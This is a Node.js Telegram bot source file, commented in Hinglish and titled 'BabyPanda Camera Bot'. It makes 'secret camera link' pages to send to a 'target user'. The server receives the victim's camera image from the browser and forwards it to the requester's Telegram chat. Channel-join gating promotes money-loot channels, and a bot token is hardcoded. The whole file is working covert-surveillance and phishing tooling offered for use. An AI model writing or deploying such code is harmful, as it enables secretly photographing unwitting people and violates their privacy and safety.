// ==============================
// 📌 BabyPanda Camera Bot (Webhook Version)
// ==============================

const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const path = require("path");


// ======================================
// 🔴 1. BOT TOKEN & DOMAIN SET KARO
// ======================================
const TOKEN = "8323199028:AAGOh1J-i10CjkuFEzFCahHMb6DQAhecsm0";
const DOMAIN = "https://babywebpanda.onrender.com";  // Render ka live link
const FORCE_CHANNELS = [
  "@fastmoneyloots",
  "@ArruSmmPenal",
  "@backup278847",
];


// ======================================
// 🚀 WEBHOOK ENABLE
// ======================================
const bot = new TelegramBot(TOKEN);
bot.setWebHook(`${DOMAIN}/bot${TOKEN}`);


// ======================================
// 🌐 EXPRESS APP
// ======================================
const app = express();
app.use(express.json());
app.use(express.static("public"));


// ======================================
// 📁 UPLOADS FOLDER
// ======================================
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

const storage = multer.diskStorage({
  destination: uploadDir,
  filename: (_, file, cb) => cb(null, Date.now() + ".jpg"),
});
const upload = multer({ storage });


// ======================================
// 🟦 TOKEN STORE (camera link)
// ======================================
const links = {}; // token → chatId


// ======================================
// 🔍 CHECK IF USER JOINED CHANNELS
// ======================================
async function isUserJoinedAll(userId) {
  for (const channel of FORCE_CHANNELS) {
    try {
      const member = await bot.getChatMember(channel, userId);
      if (member.status === "left") return false;
    } catch {
      return false;
    }
  }
  return true;
}


// ======================================
// 🎯 /start COMMAND
// ======================================
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const joined = await isUserJoinedAll(userId);

  if (!joined) {
    const buttons = FORCE_CHANNELS.map(ch => ([
      { text: `Join ${ch}`, url: `https://t.me/${ch.replace("@", "")}` }
    ]));

    buttons.push([{ text: "✅ Done Joined", callback_data: "check_join" }]);

    bot.sendMessage(chatId,
      "🚨 Pehle sab channel join karo tabhi bot chalega!",
      { reply_markup: { inline_keyboard: buttons } }
    );
  } else {
    bot.sendMessage(chatId, "✅ Access granted! Ab koi bhi image send karo.");
  }
});


// ======================================
// 🎯 DONE JOINED BUTTON
// ======================================
bot.on("callback_query", async (query) => {
  const userId = query.from.id;
  const chatId = query.message.chat.id;

  if (query.data === "check_join") {
    const joined = await isUserJoinedAll(userId);
    bot.sendMessage(
      chatId,
      joined
        ? "✅ Verified! Ab image bhejo."
        : "❌ Pehle sab channel join karo!"
    );
  }
});


// ======================================
// 📸 WHEN USER SENDS PHOTO → CREATE CAMERA LINK
// ======================================
bot.on("photo", async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const joined = await isUserJoinedAll(userId);
  if (!joined) {
    bot.sendMessage(chatId, "❌ Channel join karo phir try karo!");
    return;
  }

  const token = uuidv4();
  links[token] = chatId;

  const link = `${DOMAIN}/capture/${token}`;

  bot.sendMessage(
    chatId,
    `✅ Aapka secret camera link ready hai:\n\n${link}\n\nIsse target user ko bhejo.`
  );
});


// ======================================
// 🌐 SERVE CAMERA HTML PAGE
// ======================================
app.get("/capture/:token", (req, res) => {
  if (!links[req.params.token]) {
    return res.send("❌ Invalid or expired link!");
  }
  res.sendFile(path.join(__dirname, "public/capture.html"));
});


// ======================================
// 📤 RECEIVE IMAGE FROM BROWSER + SEND TO TELEGRAM
// ======================================
app.post("/api/upload/:token", upload.single("photo"), async (req, res) => {
  const chatId = links[req.params.token];
  if (!chatId) return res.json({ error: "Invalid token!" });

  await bot.sendPhoto(chatId, req.file.path, {
    caption: "📸 Camera image received!\n\n👑 Made by @BabyPandaHacker"
  });

  delete links[req.params.token];
  res.json({ success: true });
});


// ======================================
// 🤖 WEBHOOK ENDPOINT
// ======================================
app.post(`/bot${TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});


// ======================================
// 🚀 START SERVER
// ======================================
app.listen(3000, () => {
  console.log("Bot server running on port 3000 (Webhook active)");
});
